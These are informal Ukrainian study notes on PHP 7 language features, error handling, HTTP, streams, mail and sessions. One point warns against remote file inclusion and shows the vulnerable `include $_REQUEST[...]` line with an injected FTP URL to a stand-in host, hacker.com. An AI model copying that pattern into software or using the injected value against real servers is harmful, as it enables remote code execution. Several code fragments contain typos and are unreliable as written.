 1) Неймспейси навіть не будуть конфліктувати з підключеними бібліотеками, так як це різні області бачення. Але в такому разі мабуть треба підключати їх поменше, щоб скріпт не займав багато памяті
 2) У неймспейсі може бути будь який код, але його дія діє тільки на класи, ф-ції, трейти і константи
 3) Не обовязково неймспейси класти у змінну, потім працювати з змінною, можна на ходу це все робити
 4) Не можна у одному файлі використовувати декілька пространств імен, але якщо і робити це, то треба заключати код неймспейса у фігурні дужки
	- Різні файли можуть мати 1 неймспейс. При підключенні їх у 1 файл Котеров використовував аліаси для кожного, хоча я не впевнений що будуть конфлікти без них
 5) Так як неймспейс це реальний участок памяті, це можна використати для автолоада, оскільки шляхи будуть коректні function __autoload($classname){
															    require_once(__DIR__ . "/$classname.php");
															  }
															  $page = new PHP7\Page('О нас', 'Содержимое страницы'); - навіть без use работає
	- Хоча тут я трохи загнув, у цьому файлі, що я заінклюдив, були оператори use

-- Обработка помилок --

 6) В пхп існує 2 виводи помилок, в браузер і в лог файл. error_log - це шлях до файлу лога error_reporting(E_ALL); ini_set('error_log', 'log.txt'); ini_set('log_errors', 'true');
 7) Якщо перед фиразом э @, то пхп не покаже помилки навыть якщо там є підфункції у яких є помилки
	- але це не означає що якщо я покладу @fopen у if, а файлу не буде, то буде тру. Просто помилка не виведеться
 8) set_error_handle(funcName, $errorTypes) - можна назначити, помилки якого типу, буду обробляти я своїми кастомними ф-ціями. Якщо я вже перезаписав ф-цію, яка буде викликатись при помилці, то ця ф-ція буде працювати з моєю новою ф-цією, але поверне мою попередню. Це можна використати, якщо покласти це у змінну і після того як відпрацювала нова, назначити знов стару
 	- зазвичай використовується для не серйозних помилок
 	- funcName($errno, $msg, $file, $line){ ці змінні уже будуть їй передані } // фція, яка буде пре даватись сюди, будемати 4 аргументи - помилка, текст помилки, файл і строка. якщо моя ф-ція буде повертати фолс, викличеться стандартний обработчик
	- E_PARSE, E_ERROR важко перехватити ф-цією set_error_handle. Хіба що через буферизацію, але і то важко
	- Коли я викликав set_error_handle, попередній обработчик записується у память. Щоб його викликати, є фція - restore_error_handlerl(); Але треба щоб к-сь її викликів була такою ж як і к-сть set_error_handle
	- @ не допомагає від кастомних ф-цій для помилок, тільки якщо становити error reporting - 0 (Бажано тільки на час виконання скріпта)
 10) trigger_error() - можна створити свої помилки. Ця ф-ція дозволяє створити помилки пользовательського рівня (E_USER_ERROR, E_USER_WARNING E_USER_NOTICE) Типу на 0 ділити не можна і тд
	Типу створити свою ф-цію, присвоїти її set_error_handle, і внутрі set_error_handle описати умови, коли викличеться trigger_error. Як тільки він викличеться, скріпт зразу перекинеться у ф-цію, яку я передав у trigger_error - http://joxi.ru/nAyv8gwUXPwQkr - буде типу кетч. в trigger_error передається аргумент імя помилки, і цей же аргумент передасться в аргумент $errno в ф-ції set_error_handle - як імя помилки. Можливо він ще якісь має аргументи
 11) error_log() - дополнительна фіча для ф-ції яка записує помилку в лог. За допогогою неї, можна вказати у який файл ще можна записати помилки, чи відправити його на пошту(Пошту пожна вказати), що дописати в лог файл до помилки
 12) debug_backtrace() - покаже цепочку цієї ф-ції. Тобто і родительську, яка була викликана  і взагалі досить детально розписано содержиме ф-ції або список ф-цій. Зручно дебажити
 14) Я включав щоб показувало всі типи помилок, але всеодно, якщо я зловив цю помилку через catch, скріпт попадав у кетч і продовжував працювати, а не викидував з програми. Те саме і при set_error_handler
 14) throw - Возбудити ексепшн. Створити помилку і предати її в кетч
 13) Котеров написав дерево вложених ф-цій, там де вони викликались у скобках try. За скобками try йшов catch. У одный ыз вложених ф-цій, я викинув помилку через trow new Exeption, програма зразу кинуласть в catch, але потым не продовжила йти по дереву, а пішла виповнювати той код, що після catch з фігурними дужками
	- Якщо в цьому дереві ф-цій настворювати обєктів, і десь же у цьому дереві у ф-ції, викинути помилку, то обєкти поступово пропадуть, так як дія ф-ції закінчилась. Це пройде поступово, спочатку у тої, у якій був визваний ексепшн, потім у батьківської і тд
 14) І так можна - $this->pages[$page]()
 15) class Exception це клас, а отже він має свої методи і сваойства. Свойства і методи цього класу це восновному інфа про помилку. Меседж, імя, на якій лінії вона сталась, у якому файлі і тд. ТОбто то що в кетчі передається клас і імя змінної, якій присвоїться обєкт цього класу, то з цієї змінної можна буде витягти дані помилки. До речі дані про те де сталась помилка він знаходить за допомогою debug_backtrace(). Дані про те, цепочка яких функцій привела до помилки храниться у класі ексепшн у свойстві $trace. Щоб витягти дані з неї є метод - getTrace ().
 16) Котеров наекстендив класи від ексепшна і понаствоювар інтерфейсів. Суть у тому щоб перевіряти більш детальніше типи помилок. Якиїсь клас реалізує якиїсь або декілька інтерфейсів і потім перевіряється в кетчі - Якщо ця помилка файлова, або якась інша, кидається в різний кетч catch (IFileException $e) { якщо файлова, то це роби } catch (Exception $e) { інакше це } 
 17) Exception не може відловити всі помилки. Наприклад  $str ="Hello, world!"; Sstr[] = 4; - він не відловить, а викличеться стандартий обработчик. Але його може відловити клас Error.
	try {$str ="Hello, world!"; $str[] = 4; catch (Error $e) { echo "Спіймав";}
20) клас Error - це не Exeption. Exeption мабуть придуманий для ооп. Але ловити помилки з ним можна так само - catch (Error $e) І один і інший наслідують інтерфейс Throwable.
	- Error має декілька класів, які генеруються при помилці. За допомогою них можна уточнити який тип помилки - catch (TypeError$e).. - Типу якшо помилка в типу
 21) є ще try finnaly - його фішка в тому, що код у блоці finnaly завжди виконається.
 22) Можливо буде така ситуація, коли код в catch не достатній для обробки. В такому випадку можна в catch кинути ще 1 ексепшн і обробити його наступним try catch, який буде в коді нижче
 23) В кінці коду, Котеров привів приклад class PHP_Exceptionizer, де обробив взагалі всі типи помилок. Але той код був довгий і трохи запутаний. class PHP_Exceptionizer дозволяє обробити всі типи помилок, перетворює стандартні помилки пхп в ексепшни

---- 

24) class Directory замінить rewinddir (), readdir () closedir () - // Directory dir (string $directory [, resource) - dir замість new
	- це типу ф-ція - $cat = dir($dirname); $cat->read()
	- у ньго будуть ф-ції(читати, перемістити указник, закрити) і свойства(шлях директоріх і мітка(типу та херня, що присвоюється змінній при відкритті директорії)) для роботи з каталогом. Цим функціям можна ставити аргументи. Аргументом може бути мітка іншого каталогу, але за замовчування у цього аргумента мітка текущого каталогу // Scat= dir(" . "); Scat->read(інша категорія)
	- він повність сумістимий для роботи з стандартиними ф-ціями роботи з директоріями. Типу файлова мітка буде читатись і тд
	- До речі його ф-ція read() - поверне імя елемента, це дуже зручно. Треба подивити, можливо і інші подібні, або стандартні подібні щось таке роблять
	- class Directory не нассліється
 14) Наскільки я зрозумів, якщо є yeild, це вже клас генератор. Тобто там вже зразу будуть ці ф-ції current(), next(). 
	function simple($from = O, $to= 100){ for($i = $from; $i < $to; $i++) { yield $i; $obj= simple(!, 5);}
	while($obj->valid()) { echo ($obj->current(); }

 15) bindTo() - У Замикання можна поставити $this класа $this->name=333; (обєкта). типу це з ф-ції можна вказати. Котеров зробив клас з якого буде робитись сторінка і вже вне класа через замикання указував які дані будуть у неї, оскільки мав доступ
	- схоже на те, ніби ця ф-ція була б в класі. Як call в скріпті - визви цю фцію в тілі іншого обєкта або класа. Це залежить выд того що мены треба. Оскільки статичні змінні не можна визвати через this, замість this треба писати NULL

) ) ;
 16) class IntlChar - цей клас може бути не доступний, якщо вын не активований в php.ini. Типу як є обєкт Math для роботи з числами, то це схоже для роботи з усіма елементами пхп
 17) Клас DateTime - для роботи з датами, тільки для ооп. 
	- формат дати $date= new DateTime(сюди передавати дату); $date->format(дд мм ...). 
	- Також дополнытельним параметром для DateTime можна вказати тайм зону, яку можна назначити через клас DateTimeZone. Якщо в конфігах пхп таймзона взагалі не встановлена, то видасть помилку
 18) diff() - скаже різницю у часі між двома класами DateTime() - типу різниця між часом які хранять у собі ці обєкти 1 рік 3 місяці і тд - $date= new DateTime('2015-01-01 0:0:0'); Snowdate =new DateTime(); $interval= $nowdate->diff($date); - print_r($interval); - видасть конкретнішу інфу (секунди, мілісікунди...) Також у класа буде свойство invert (1 або 0)- Воно скаже чи ця різнця плюсова чи мінусова 
 19) add(), sub() - добавити, відняти час від DateTime
	- class Daternterval - рандомна дата.  - $nowdate =new DateTime(); $date=- $nowdate->sub(new Dateinterval("P3YlM14DT12Hl9M2S")); - Дата в нього передається дивним форматом, записувати не буду, краще загуглити
 20) DatePerіod - дозволяє створити ітератор для foreach, степ якого буде залежати выд дати - $now= new DateTime();  $step= new Dateinterval('PlW'); $period= new DatePeriod($now, $step, 5); foreach($period as $datetime) { echo $datetime->forrnat("Y-m-d") ."<br />"; } - 2015-11-28
2015-12-05 2015-12-12
 21) Котеров показував у приклад якысь не знайомі ітератори папок і файлів. 
	- getIterator(Iterator) - цей метод мож написати в класі і тепер назначеним ітератором буде оброблятись окземпляр йього класу
 22) foreach ($d->getiterator() as $path=> $entry) {} == foreach ($d as $path=> $entry) {} типу можна назначити декілька ітераторів для класа, але якщо не назначу, то буде стандартний, той який я вказав у методі getIterator
	- Не забувати, що коли я вже зробив ітератор з класа (Як на лабі у спеціаліста, а потім пропускав їх через цикли), то обєкт цього класа буде мати його методи. Можна зразу писати foreach($o->rewind(); $o->valid(); $o->next()){...}

 -- рефлекшни --

 23) call_user_func() теж можна визвати методи обэкта або класа, якщо метод статичний. Вона і з рефлекшнами працює
	- call_user_func_arg() - те саме, але аргументи можна передати масивом
 24) Також є можливість створити екземпляр класа, якщо клас знаходиться в змінній. $className = "MathComplex"; $obj= new $className(6, l); 
	- Якщо при роботі з рефлекшнами є помилка, її можна перехвати, так як я знаю її, це ReflectionException // catch ReflectionException $e
	- Reflection може створити 2 обэкти з одинакових елементів. І зміна одного не повліяє на інший
	- Якщо розпечатати екстенджений рефлекшн клас, то свойства екстендженого класу, які прийшли в наслідок будуть казати, що вони відносяться до того від кого вони заекстендились, а методи будуть казати, шо вони належать до текущого класу
 25) ReflectionProperty має методи сет і гет велью. Їм у аргумент передаються обєкти, у яких це свойство буде мінятись getValue(Sobject, $value)
 26) Заголовок може бути посланий браузеру після вивода інфи у браузер, якщо його послати через буферизацію. Якщо не в буферизації, то вискочить помилка - Warninq: cannot modify header information - headers already sent by (output startedat badheader.php : 2) in badheader . php on line 3 - типу заголовки вже всі послані і вивід інфи почався на 2-1 лінії, а в 3-й я написав заголовок, який привів до помилки
	- headers_sent() - ф-ція скаже чи був виведений якиїсь текст на момент виведення цієї ф-ції. Якщо текст був вже виведений, то передавання заголовків закінчилось (це і перевіряє ця ф-ція) і якщо я напишу ще заголовки - буде помилка. У неї є 2 аргументи $file, $line. У них храняться дані у якому файлі і на якій лінії вув перший вивід строк
	- ф-ція setcookie() - це теж заголовок
 27) Запрет кешквання. Всі 6 строк ттреба писати - function nocache() { header{"Expires : Thu, 19 Feb 1998 13:24:18 GMT") ; header("Last-Modified : " • groclate("D, d MY H:i : s") . "GMT") ; header("Cache-Control : no-cache, must-revalidate"); header("Cache-Control : post-check=O,pre-check=O");  header("Cache-Control : max-age=O"); header("Pragma: no-cache");}
 	- Заголовки, які я написав перед відправденням записуються в спеціальний буфер, щоб відправляти всі зразу а не по одиночку. Щоб получити всі заголовки, які накоплені в цьому стандартному буфері є ф-ція headers_list();
	- Content-type: text/plain - це стандарт http - імя заголовка, дві крапки, значення заголовка
 28) gatallheaders() - Хранить у собі список Заголовків у масиві, які приходять браузеру (і ті що я явно не вказував, дефолтні)
	- але не треба зловживати цією ф-цією. Якщо я хоч подивити дані про браузер користувача, то краще використати $_SERVER
 29) Ф-ція setcookie() не запише дані нукуди. Ні в масив $_COOKIE, ні в які глобальні змінні. Вона по ходу викличеться тільки при наступному виклику скріпта ( Слідуючий запрос сервера по ходу ). Але при наступному виклику, вона викличеться навіть якщо ф-ція setcookie не була викликана. Сам не зрозумів як це може бути, що не треба її викликати кожного разу. Мабуть мається на увазі цей запис setcookie ();
	- Параметр $value - автоматом кодується і розкодується при передаванні/розбиранні, тож не треба за це переживати
	- Дані кукі також передадуться у масив $_REQUEST // $_REQUEST['COOKIE'];
	- Краще не передавати багато ррізних кукі одному браузеру, браузери лімітують к-сть кукі. Не розмір, а к-сть. Тож якщо не вдається запихнути дані в 1 кукі файл, краще написати свою ф-цію, яка зможе це зробити.
 30) Розбивання QUERY_STRING - parse_str() - Для роботи з адресною строкою. Розбере або сформує QUERY_STRING (може і в багатовимірний, в залежності від даних). Коли він бере або передає дані з QUERY_STRING, він зберігає усі стандaрти HTTP ( плюс міняє на пробел і тд ). Трохи схоже на розбір даних як робить $_GET або $_POST
	- parse_str(strinq $str [, array $out]) - $str - це адресна строка, $out - це результат розбору - масив
	- строка у котерова, яку він розбирав цією ф-цією, виглядала так - "sullivan=paul&names[roy]=noni&names[read]=tom". // names це багатовимірний масив у якому хранятся [roy]=noni і [read]=tom
	- Якщо аргумент $out не вказаний, то створяться змінні з даними, як у адресній строці у ту область бачення, де ця ф-ція була викликана, тобто якщо вона була викликана у ф-ції, то змінні створяться у ній, якщо вона була викликана глобально, змінні будуть у глобальній області бачення. Типу якщо є ця срока - "sullivan=paul&names[roy]=noni&names[read]=tom", то до змінних можна буде достукатись - $sullivan, $names['roy'], names['read']
 31) http_build_query - як parse_str, тільки навпаки - збирає QUERY_STRING по вказаним даним з асоціативного масива. У неї є аргументи, якими можна вказати яким символом будуть розділятись дані (& зазамовчуванням) і яким символом буде кодуватись пробел ( за замовчуванням +, але можна змінити на %20 наприклад)
	- Короткий воркфлоу - 
	- Також є необовязковий аргумент $numericPrefix, яким можна подавати префікси. Це корисно, так як в пхп не можна створювати змінні типу $1; з префіксом буде $PREFNAME_1
 32) parse_url() - розбирає адресну строку на частини. Дані будуть хранитись в масиві і достукатись до даних можна буде по ключам масиву, імя яких вже оприділені у ф-ції. Всі перечисляти не буду, краще загуглити, там все понятно. Якщо для якихось ключів у адресній строці немає даних, вони не будуть створені
	- + я не зрозумыв чому якщо у хості є @, то хост теж розбивається на частини. То що було до @ попадає у ключ user, а те що після у ключ host. А сам @ нікуди не попадає. 
		- $url = "http://user@example.com:80/path?arg=value#anchor"; print_r($parsed); // Array ( [scheme] => http [host] => example.com [port] => 80 [user] => user [path] => /path [query] => arg=value&names%5Bread%5D=tom [fragment] => anchor ). Я загуглив і виявилось, що юзер і пароль можна вказати у адресній строці і вони будуть розділені двокрапкою,  і вони використовуються у випадку, коли  FTP або HTTP просить логін,пароль. До речі для прароля в адресній строці теж є свій ключ - pass
	- Ф-ції, що робить обратний ф-ціонал, тобто збирає адресну строку з кусків масиву немає, але Котеров написав самопись у файлі koterov-doc/php7/www/modify_url.php
	- Якщо у QUERY_STRING змінні знаходяться у багатовимірному масиві ("names[roy]=noni&names[read]=tom"), То для обробки їх, з них треба зробити строку (http_build_query). Щоб перевірити чи вони в багатовимірному масиві чи це просто строка, можна провіркою на скалярність, так як масив це не скалярне значення, а строка - скалярне - if (@!is_scalar($url['query'])
33) Протокл http по ходу для файлових серверів, для інших є свої. Наприклад для поштових серверів протокол mailto

 ------- Сетеві ф-ції ----
 31) PHP має технологію потоків для ф-цій fopen (),file (), file_get_contents (), opendir (),include ..., які можуть працювати не тільки з файлами, а і з зовнішніми HTTP-адресами. Потоки придназначені для переноса файлів з істочника в пункт призначення. Істочником абу пунктом назначення може бути команднас строка, архів, область в памяті, HTTP-сервер і т д. Файлові операції відрізняються від мережевих. Потоки скривають реалізацію операцій і автоматично оберають потрібний обработчик. Обработчик залежить від перфікса - http://, ftp:// ...
	- Якщо я напишу так в пустій сторінці, то у мене буде майже ідентична сторінка php.ini - echo file_get_contents("http://php.net");
	- Для фтп доступно навіть file_put_contents() // file_put_contents("ftp ://user:pass@site.ru/f.txt", "This is my world!");
	- При викорстовуванні ф-цій для роботи з файловою системою, типу file_get_contents(), fopen (), PHP автоматично вибирає обработчик file://, хоча його можна і явно задати // echo file_get_contents('file:///etc/hosts');
	- php.ini - allow_url_fopen=Off - заборонити читати файли з мого серверу
 32) !ВЗЛОМ. Котеров казав ніколи так не робити. Наприклад я підключаю собі файл, імя якого знаходиться у змінній, а імя змінної залежить від введених у форму даних. ТОді хакер може підставити замісь цієї змінної свій файл, який лежить у нього на сайті. 
		include $_REQUEST [ 'dirnarne' ] . "/header. php";
		di rnarne=ftp: 11 root:z1ONO10@hacker.com
		- І тепер виповниться код на моєму сервері, код хакера з цієї папки ftp://root:ZlONOlOl@hacker.com/header.php
	- Мораль - не використовувати змінні у ф-ціях підключення
 33) Помимо http://, ftp:// ..., можна відкривати і архіви. fopen ( "rar : /path/to/file.rar", "r"); Котеров це не розписував, тыльки казав що у таких ф-цій є префікс stream, інше все нагуглити http://php.net/manual/ru/ref.stream.php
 34) У цих ф-цій для роботи з файлами зазвичай є аргумент контекст, який можна змінити на свій. Контекст - це заголовки вроді. Тож стукаючись до серсера, заголовки, які я йому буду передавати,  можна поставити свої. Ці параметри теж можна налаштувати в php.ini. Заголовки Котеров написав у масиві, а щоб зробити з нього контекст, пропустив цей масив через ф-цію stream_context_create
 35) Сокети - теж саме але устарівше - fsockopen. Я не читав про це
 36) gethostbyaddr() - подивити, який домен у заданої айпішки. Але без гарантій. Власник хоста може назначити що завгодно. Буває що сайт має декілька айпішок, декілька доменів і для оптимізації, перенаправляє туди, де менше нагрузки
 37) gethostbynamel() подивити яка айпішка у домена. вона на відміну від попередньої, поверне всі айпішки
 ---  Письмо ---
 38) Заголовки письма - From, To, Subject, Content-type(тип(text/plain зазвичай) і кодіровка ), Reply-To(це коли приходить письмо, то там э кнопка - відповісти. Якщо у цей заголовок нічого не вказати, то при клацанні на неї, у поле відправника поставиться моя адреса). Заголовки мають бути розділені \r\n - тобто 1 заголовок, одна строка
 39) Значення заголовка може бути роздылено на частини. Для цього треба використовувати пробіли або табуляції (\n\t) // "Content-type: text\html; \n\tcharset=UTF-8" 
 40) Письмо може содержати будь що, але якщо це тільки текст, то його можна зразу передавати, а якщо посложнее, то треба кодувати в base64
 41) Котеров і заголовок from поставив у 4-й аргумент ф-цїї mail і ще додав туди декілька. Це я до того що все дуже гнучко
	- Список получателів письма можна вказати масивом
	- Але не треба вказувати To, Subject 4-м аргументом, Оскільки якщо я вкажу їх в основних арукментах пустими, то ця ф-ція так працює, що продублює їх і получится 2 заголовки To і 2 Subject. З To ще більш менш а з Subject можуть бути проблеми. Котеров написав ф-цію для таких випадків 
 42) Котеров створив 2 змінні ( контент письма і відправник(масив) ) і казав шо зазвичай так і є, що це змінні. А скелет письма з заголовками, створив у файлі з розширенням eml(цей формат читає майкрософт). Потім file_get_contents скелета. Створив цикл, який замінив дані скелета на потрібні. Цей цикл залежав від кількості відправників. Потім регуляркою розділив скелет на хедер і контент письма
 43) Я пропустив письма, треба перечитати

 44) Сесії в різних вікнах одного користувача мають різні айдішки. Хоча в мене вроді все до одного було привязано. Хоча може тому що це були вкладки
 45) видалити сесію - $_SESSION= [] @unset($_COOKIE[session_narne()]); session_destroy();
 46) session_ name(імя) задавати імя, щоб не було конфліктів з іншими сесіями. Ця ф-ція також повертає імя текущої сесії. Але якщо я переіменував імя, то ф-ція поверне імя попередньої сесіїї. Не задавати імя сесії, коли сессія вже йде. Кожне імя - різне пространство імен.
 47) Котеров рекомендував сесію робити багатовимірним масивом і все туди складувати по полках, так краще за все
 48) Ф-ції які займаються обробкою сесії. їх можна переписати, якщо хочу, або назначити свої цією ф-цією - session_set_save_handler($qien, $close, $read, $write, $destroy, $gc). Вона має бути викликана до session_start. Це стандартні ф-ції, які викликаються при роботі з session_name(). Котеров прказав як їх використати у файлі /var/www/html/koterov-doc/php7/session/handlers.php Тут Котеров зробив сесію багатовимірним масивом і розклав імя сесій по папках з іменем сесії
	 - handler_open() запускається зразу після session_start()
	 - handler_ close() - викликаэться коли даны записаны у хранилище і його треба закрити.
	 - handler_read() - викликажться, коли запрошую дані сесії
	 - handler_write() для запису даних
	 - handler_destroy() - коли вбивається сесія
	 - handler _qc - це для чистки сесії, але я не став розписувати, подивлю коли треба буде
 49) php 7 не має mysql тільки pdo
	- Про налаштування пхп було на 637 сторінці. В php.ini є пункт, який настроює дозвіл пошуку геолокації
 50) Для провірки даних в пхп є фільтри. щоб не писати довгі регулярки
	- filter_var - $email_correct = 'igorsimdyanov@gmail.com'; echo "correct="filter_var($email_correct, FILTER_VALIDATE_EMAIL) це константа для провірки майлів
	- Корисно це все і не важко розібратись. Багато констант, які розширяють функціонал. Для юрлок, для айпішок, чисел, флоатів, регулярок ... краще загуглити
	- filter_var_array - приймає асоціативний масив щоб відфільтрувати. Ф-ція приймає першим агруметом масив з даними, які треба відфільтрувати, а другий аргумент буде мати масив з фільтрами для кожного елемента у масиві який буде фільтруватись
	- Також фільтри вміють не тільки перевіряти дані, але і додавати (заміняти плюси на мінуси, повертати ту адресу пошти яка може пройти валідацію (видалить слеші наприклад )) Додавання даних проісходить уже на вкінці, на виході
	- Воно ще й символи дивні в символи хтмл(&lt;hl&gt) кодує. Короче крута штука, можна буде подивити десь
	 - Також є можливість додати кастомну ф-цію, яка буде фільтрувати дані



 По ходу в пхп як і в скріпті - {фігкрні дужки} означають блок, типу вказівний, що цей код разом чи щось таке


Сокети








